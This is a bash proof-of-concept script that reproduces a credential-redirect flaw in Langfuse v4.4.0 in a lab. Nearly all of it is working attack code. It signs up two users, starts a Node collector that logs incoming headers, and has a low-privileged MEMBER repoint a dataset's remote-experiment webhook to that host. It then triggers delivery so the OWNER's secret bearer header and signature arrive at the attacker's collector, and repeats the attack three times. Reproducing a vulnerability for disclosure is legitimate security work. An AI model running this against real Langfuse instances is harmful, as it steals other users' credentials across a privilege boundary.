#!/usr/bin/env bash
# Reproduction — Langfuse: dataset remote-experiment credential redirect
#
# Target: Langfuse v4.4.0 (6eac2f37d766d940e2fc93de90f7ba715405aee4)
# Stock docker-compose.yml, no configuration changed except published ports
# (3000 -> 127.0.0.1:20502) for lab containment.
#
#   BASE=http://localhost:20502 NETWORK=rl-langfuse_default ./repro.sh
#
# Boundary tested: a project MEMBER repoints a dataset's remote-experiment
# webhook to a host they control and receives the credentials an OWNER
# provisioned for the original destination.
#
# The load-bearing part is CONTROL 2. It performs the SAME logical operation —
# move a stored credential's destination without supplying a new secret — on
# Langfuse's own llm-api-key router, and is REFUSED. That is the product's
# existing standard for this pattern, so the success below cannot be dismissed
# as intended design.
#
# NOTE ON HOSTNAME: NEXTAUTH_URL is http://localhost:<port>. next-auth checks
# the Host header against it, so BASE must use `localhost`, not 127.0.0.1, or
# the credentials callback silently fails to set a session cookie.

set -euo pipefail

BASE="${BASE:-http://localhost:20502}"
NETWORK="${NETWORK:-rl-langfuse_default}"
WEB_CONTAINER="${WEB_CONTAINER:-rl-langfuse-langfuse-web-1}"
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUT="$HERE/run-artifacts"          # never overwrite the shipped evidence files
mkdir -p "$OUT"
COLLECTOR="repro-langfuse-collector"

STAMP="$(date -u +%H%M%S)"
A_EMAIL="repro-a-${STAMP}@lab.local"; A_PASS="Lab-Passw0rd-A1"
B_EMAIL="repro-b-${STAMP}@lab.local"; B_PASS="Lab-Passw0rd-B1"
MARKER="CVEHUNT-LANGFUSE-${STAMP}-A"          # principal A's secret header value

JA="$(mktemp)"; JB="$(mktemp)"
cleanup() {
  docker rm -f "$COLLECTOR" >/dev/null 2>&1 || true
  rm -f "$JA" "$JB"
}
trap cleanup EXIT

say() { printf '\n\033[1m==> %s\033[0m\n' "$*"; }
fail() { printf '\033[31mFAIL: %s\033[0m\n' "$*"; exit 1; }

# tRPC helpers. $1 = procedure, $2 = JSON input, cookie jar via $JAR.
trpc() { curl -sS -b "$JAR" -c "$JAR" -X POST "$BASE/api/trpc/$1" \
           -H 'Content-Type: application/json' -d "{\"json\":$2}"; }
jval()  { sed -E "s/.*\"$1\":\"([^\"]+)\".*/\1/"; }

signup_and_login() {  # $1=email $2=pass $3=name $4=jar
  curl -sS -X POST "$BASE/api/auth/signup" -H 'Content-Type: application/json' \
    -d "{\"name\":\"$3\",\"email\":\"$1\",\"password\":\"$2\"}" >/dev/null
  local csrf
  csrf="$(curl -sS -c "$4" -b "$4" "$BASE/api/auth/csrf" | jval csrfToken)"
  curl -sS -c "$4" -b "$4" -X POST "$BASE/api/auth/callback/credentials" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode "csrfToken=$csrf" --data-urlencode "email=$1" \
    --data-urlencode "password=$2" --data-urlencode "json=true" >/dev/null
  curl -sS -b "$4" "$BASE/api/auth/session" | grep -q "\"email\":\"$1\"" \
    || fail "could not establish a session for $1 (is BASE using 'localhost'?)"
}

# ── preflight ────────────────────────────────────────────────────────────────
say "preflight"
command -v docker >/dev/null || fail "docker not on PATH"
docker ps --format '{{.Names}}' | grep -q "^${WEB_CONTAINER}$" \
  || fail "$WEB_CONTAINER is not running"
curl -sS -o /dev/null "$BASE/api/auth/csrf" || fail "$BASE is not answering"
echo "langfuse reachable at $BASE"

# ── setup ────────────────────────────────────────────────────────────────────
say "principal A (OWNER) and principal B (MEMBER)"
signup_and_login "$A_EMAIL" "$A_PASS" "ReproA" "$JA"
signup_and_login "$B_EMAIL" "$B_PASS" "ReproB" "$JB"

JAR="$JA"
ORG="$(trpc organizations.create '{"name":"ReproOrg-'"$STAMP"'"}' | jval id)"
PROJ="$(trpc projects.create "{\"name\":\"ReproProj\",\"orgId\":\"$ORG\"}" | jval id)"
# orgRole MEMBER grants datasets:CUD on every project in the org. Using the org
# role avoids the project-role entitlement, which is a paid feature — the point
# is that MEMBER is enough, and this is the least-privileged way to show it.
trpc members.create "{\"orgId\":\"$ORG\",\"email\":\"$B_EMAIL\",\"orgRole\":\"MEMBER\"}" >/dev/null
DS="$(trpc datasets.createDataset "{\"projectId\":\"$PROJ\",\"name\":\"repro-ds\"}" | jval id)"
echo "org=$ORG project=$PROJ dataset=$DS"
echo "B is an org MEMBER — the lowest role holding datasets:CUD"

say "starting the receiving collector on the langfuse network"
: > "$OUT/collector.log"
docker rm -f "$COLLECTOR" >/dev/null 2>&1 || true
docker run -d --name "$COLLECTOR" --network "$NETWORK" -v "$OUT:/out" node:22-alpine node -e "
require('http').createServer((q,s)=>{let b='';q.on('data',d=>b+=d);q.on('end',()=>{
  const h=Object.entries(q.headers).map(([k,v])=>k+': '+v).join('\n');
  require('fs').appendFileSync('/out/collector.log',
    '===== '+new Date().toISOString()+' =====\n'+q.method+' '+q.url+'\n'+h+'\n\n'+b+'\n\n');
  s.writeHead(200,{'content-type':'application/json'});s.end('{}');});}).listen(80);
" >/dev/null
sleep 3
COL_IP="$(docker inspect "$COLLECTOR" --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')"
[ -n "$COL_IP" ] || fail "collector did not get an IP on $NETWORK"
echo "collector listening at http://$COL_IP/collect"

say "A configures the remote experiment — legitimate URL, secret header, signing on"
JAR="$JA"
SECRET="$(trpc datasets.upsertRemoteExperiment "$(cat <<JSON
{"projectId":"$PROJ","datasetId":"$DS","url":"http://example.com/run",
 "defaultPayload":"{}","enabled":true,"signingEnabled":true,
 "requestHeaders":{"Authorization":{"secret":true,"value":"Bearer $MARKER"}}}
JSON
)" | jval unencryptedSecretKey)"
echo "A's secret header value : Bearer $MARKER"
echo "A's webhook signing key : ${SECRET:0:20}…"

# ── control 1 ────────────────────────────────────────────────────────────────
say "CONTROL 1 — B updates the config WITHOUT changing the URL, headers omitted"
JAR="$JB"
trpc datasets.upsertRemoteExperiment \
  "{\"projectId\":\"$PROJ\",\"datasetId\":\"$DS\",\"url\":\"http://example.com/run\",\"defaultPayload\":\"{}\",\"enabled\":true}" \
  | grep -q '"datasetId"' || fail "control 1 did not succeed"
echo "accepted — preserving stored secrets on a partial update is intended behaviour"

# ── control 2 ────────────────────────────────────────────────────────────────
say "CONTROL 2 — the same operation on the guarded sibling router"
echo "moving a stored credential's destination without supplying a new secret"
JAR="$JA"
# llmApiKey.create returns null rather than the created row, so the id has to be
# read back from the list query.
trpc llmApiKey.create "$(cat <<JSON
{"projectId":"$PROJ","provider":"repro-lab","adapter":"openai",
 "secretKey":"sk-repro-$STAMP","baseURL":"http://example.com/v1"}
JSON
)" >/dev/null
KEY_ID="$(curl -sS -b "$JA" -G "$BASE/api/trpc/llmApiKey.all" \
            --data-urlencode "input={\"json\":{\"projectId\":\"$PROJ\"}}" | jval id || true)"
if [ -n "${KEY_ID:-}" ]; then
  C2="$(trpc llmApiKey.update "{\"id\":\"$KEY_ID\",\"projectId\":\"$PROJ\",\"provider\":\"repro-lab\",\"adapter\":\"openai\",\"baseURL\":\"http://$COL_IP/v1\"}")"
  if echo "$C2" | grep -q "Secret key is required when changing the base URL"; then
    echo "REFUSED — \"Secret key is required when changing the base URL\""
    echo "(llm-api-key router: testUpdate :543, update :636)"
  else
    echo "unexpected response, recording verbatim:"; echo "$C2"
  fi
else
  echo "SKIPPED — could not provision an LLM key in this environment."
  echo "The guard is still readable at web/src/features/llm-api-key/server/router.ts:543 and :636."
fi

# ── attack ───────────────────────────────────────────────────────────────────
say "ATTACK — B repoints the URL to their own host, requestHeaders OMITTED"
JAR="$JB"
trpc datasets.upsertRemoteExperiment \
  "{\"projectId\":\"$PROJ\",\"datasetId\":\"$DS\",\"url\":\"http://$COL_IP/collect\",\"defaultPayload\":\"{}\",\"enabled\":true}" \
  | grep -q '"datasetId"' || fail "the repoint was rejected"
echo "accepted — identical to CONTROL 1 except the url value"

say "ATTACK — B fires the delivery, same datasets:CUD scope"
trpc datasets.triggerRemoteExperiment "{\"projectId\":\"$PROJ\",\"datasetId\":\"$DS\"}" \
  | grep -q '"success":true' || fail "trigger did not report success"
sleep 4

say "what arrived at B's host"
cat "$OUT/collector.log"

grep -q "Bearer $MARKER" "$OUT/collector.log" \
  || fail "principal A's secret header did NOT arrive — finding not reproduced"
grep -qi "x-langfuse-signature" "$OUT/collector.log" \
  || fail "no Langfuse signature on the delivered request"
echo
echo "CONFIRMED — A's secret header ($MARKER) and a valid x-langfuse-signature"
echo "were delivered to a destination chosen by a MEMBER."

# ── determinism ──────────────────────────────────────────────────────────────
say "three consecutive reproductions"
: > "$OUT/repeat.log"
for i in 1 2 3; do
  JAR="$JA"   # A resets to the legitimate destination
  trpc datasets.upsertRemoteExperiment \
    "{\"projectId\":\"$PROJ\",\"datasetId\":\"$DS\",\"url\":\"http://example.com/run\",\"defaultPayload\":\"{}\",\"enabled\":true}" >/dev/null
  before="$(grep -c "Bearer $MARKER" "$OUT/collector.log" || true)"
  JAR="$JB"   # B repoints and fires
  trpc datasets.upsertRemoteExperiment \
    "{\"projectId\":\"$PROJ\",\"datasetId\":\"$DS\",\"url\":\"http://$COL_IP/collect\",\"defaultPayload\":\"{}\",\"enabled\":true}" >/dev/null
  trpc datasets.triggerRemoteExperiment "{\"projectId\":\"$PROJ\",\"datasetId\":\"$DS\"}" >/dev/null
  sleep 4
  after="$(grep -c "Bearer $MARKER" "$OUT/collector.log" || true)"
  if [ "$after" -gt "$before" ]; then verdict=PASS; else verdict=FAIL; fi
  printf 'run %d  %s  marker-hits %s->%s  %s\n' \
    "$i" "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$before" "$after" "$verdict" | tee -a "$OUT/repeat.log"
  [ "$verdict" = PASS ] || fail "run $i did not reproduce"
done

echo
echo "3/3 deterministic. Not intermittent."
echo "Artifacts: $OUT/collector.log, $OUT/repeat.log"
